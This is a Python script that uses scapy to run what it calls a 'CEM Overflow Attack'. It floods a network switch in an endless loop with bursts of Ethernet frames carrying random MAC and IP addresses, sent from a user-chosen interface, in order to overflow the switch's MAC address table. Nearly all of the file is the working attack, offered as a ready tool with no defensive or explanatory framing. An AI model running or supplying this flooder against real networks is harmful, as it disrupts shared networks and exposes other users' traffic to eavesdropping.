#!/usr/bin/env python3
import sys
try:
	import os.path
	import argparse
	from scapy.all import *
except ImportError as Error:
	print("Failed to import library - {}".format(Error))
	print("Please check if needed libararies are installed, or run the installer once more.")
	sys.exit(1)

def Get_Interface_State(Interface):
        try:
                if os.path.exists("/sys/class/net/" + Interface + "/"):
                        TempFileObj = open("/sys/class/net/" + Interface + "/operstate")
                        return TempFileObj.readline().strip()
                else:
                        return "NULL"
        except Exception as Error:
                print("Error - {0}".format(Error))
                return "NULL"

def Generate_Packages(Number=2048):
	Package_list = []
	for i in range(0,Number):
		packet = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
		Package_list.append(packet)
	return Package_list

def Send_Packages(package_list, interface=None, verbose_bool=False):
	try:
		if verbose_bool:
			print("Sending Network Packages...")
		if interface is not None:
			sendp(package_list, iface=interface, verbose=verbose_bool)
		else:
			sendp(package_list, verbose=verbose_bool)
	except Exception as Error:
		print("Encountered an error while sending network packages.\nError: - {0}".format(Error))

__version__ = "0.2.0.2A"

if __name__ == "__main__":
	Parser = argparse.ArgumentParser(
	description=""
	)
	Parser.add_argument("-i","--Interface",help="The interface to send packages out from.")
	Parser.add_argument("-s","--Size",help="Sets the package buffer size in number of packages per package burst.")
	Parser.add_argument("-V","--Version",action="version",version="%(prog)s " + __version__,help="Show the version of the program.")
	Parser.add_argument("-v","--Verbose",action="store_true",help="Enables verbose logging.")
	Args = Parser.parse_args()

	#Declare Variables
	UseInterface=False
	PackageSize=Args.Size

	if Args.Interface and Args.Interface == "lo":
		UseInterface = True
	elif Args.Interface:
		try:
			if Get_Interface_State(Args.Interface) == "up":
				UseInterface = True
			elif Get_Interface_State(Args.Interface) == "down":
				print("Interface {0} is down.".format(Args.Interface))
				sys.exit(1)
			else:
				print("{0} does not exists!".format(Args.Interface))
				sys.exit(1)
		except Exception as Error:
			print("Error - {0}".format(Error))

	#Main Application Loop
	if UseInterface:
		print("Starting the CEM Overflow Attack on interface: {0}".format(Args.Interface))
	else:
		print("Starting the CEM Overflow Attack.")

	try:
		while True:
			if Args.Verbose and Args.Size:
				print("Generating {0} Network Packages...".format(Args.Size))
			elif Args.Verbose:
				print("Generating 2048 Network Packages...")

			if PackageSize is not None:
				try:
					NetworkPackages = Generate_Packages(PackageSize)
				except Exception as Error:
					print("Encounted a error while generated network packages. Error - {0}".format(Error))
			else:
				try:
					NetworkPackages = Generate_Packages()
				except Exception as Error:
					print("Encounted a error while generated network packages. Error - {0}".format(Error))

			if UseInterface and Args.Verbose:
				try:
					Send_Packages(NetworkPackages, Args.Interface, Args.Verbose)
				except Exception as Error:
					print("Encounted a error while sending network packages. Error - {0}".format(Error))
			elif UseInterface:
				try:
					Send_Packages(NetworkPackages, Args.Interface)
				except Exception as Error:
					print("Encounted a error while sending network packages. Error - {0}".format(Error))
			elif Args.Verbose:
				try:
					Send_Packages(NetworkPackages, Args.Verbose)
				except Exception as Error:
					print("Encounted a error while sending network packages. Error - {0}".format(Error))
			else:
				try:
					Send_Packages(NetworkPackages)
				except Exception as Error:
					print("Encounted a error while sending network packages. Error - {0}".format(Error))
	except KeyboardInterrupt:
		print("Stopping the CEM Overflow Attack!")
		sys.exit(0)
